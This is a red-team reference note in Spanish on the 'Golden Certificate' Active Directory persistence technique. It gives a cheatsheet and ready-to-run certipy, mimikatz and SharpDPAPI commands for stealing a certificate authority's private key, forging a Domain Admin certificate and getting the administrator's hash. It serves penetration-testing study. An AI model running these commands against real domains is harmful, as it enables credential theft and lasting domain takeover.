---
aliases:
  - Golden Certificate
  - CA Key Theft
  - DPERSIST1
tags:
  - technique/persistence
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: Technique
linked:
  - "[[AD CS Abuse]]"
  - "[[Golden Ticket]]"
  - "[[UnPAC-the-hash]]"
---
# Golden Certificate

Persistencia de dominio robando la **clave privada de la CA** (Enterprise CA de AD CS). Con la private key + el cert de la CA podés **forjar certificados válidos para cualquier identidad** (incluido un DA) de forma offline e ilimitada. Equivale al Golden Ticket pero en el plano de certificados: mientras no se rote la CA, tenés llave maestra del dominio.

Es la técnica **DPERSIST1** del paper Certified Pre-Owned. Requiere acceso administrativo al **servidor CA** (para extraer la key).

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy ca -backup -ca 'corp-CA' -u U@corp.local -p P` | Exporta cert + **private key** de la CA (`.pfx`) | Con admin sobre el CA host. |
| `mimikatz # crypto::certificates /systemstore:local_machine /store:my /export` | Extrae certs+keys de la CA (si no es exportable, `crypto::capi`/`crypto::cng` patch) | Desde el CA host. |
| `SharpDPAPI.exe certificates /machine` | Certs de máquina incl. CA key vía DPAPI | Alternativa post-explotación. |
| `certipy forge -ca-pfx ca.pfx -upn administrator@corp.local -subject 'CN=Administrator'` | **Forja** un cert de DA con la CA key robada | Acceso persistente. |
| `certipy auth -pfx administrator_forged.pfx -dc-ip $IP` | TGT + NT hash del DA con el cert forjado → [[UnPAC-the-hash]] | Re-entry cuando quieras. |

```bash
# 1. Robar la CA private key (con admin en el CA)
certipy ca -backup -ca 'corp-CA' -u admin@corp.local -p 'Pass' -target ca.corp.local
# 2. Forjar cert para cualquier usuario (offline, sin tocar el DC)
certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local
# 3. Autenticar → hash del DA
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

---

## Overview

AD CS confía en cualquier certificado emitido/firmado por su CA. Si controlás la **private key de la CA**, podés **firmar certificados arbitrarios** sin pasar por el servidor de enrollment ni dejar registro en la CA — el DC los acepta como válidos para PKINIT/Schannel.

**Por qué es persistencia top:** la única forma de revocarlo es **rotar la CA entera** (re-emitir todos los certs del dominio), algo que casi nadie hace. Sobrevive a cambios de password, reset de krbtgt, etc.

**Diferencia con [[AD CS Abuse]] (ESCx):** ESC explota *misconfiguraciones* de templates para que la CA te emita un cert. Golden Certificate **roba la CA misma** → no necesita ninguna misconfig, forja todo offline.

> [!warning] Requiere comprometer el CA host
> No es escalada: necesitás admin local en el servidor de la Enterprise CA. Es lo que hacés *después* de tener el dominio, para no perderlo.

---

## Recursos

- [SpecterOps — Certified Pre-Owned (DPERSIST1)](https://posts.specterops.io/certified-pre-owned-d95910965cd2) — paper original de AD CS.
- [ly4k/Certipy — ca / forge](https://github.com/ly4k/Certipy) — backup de CA y forja.
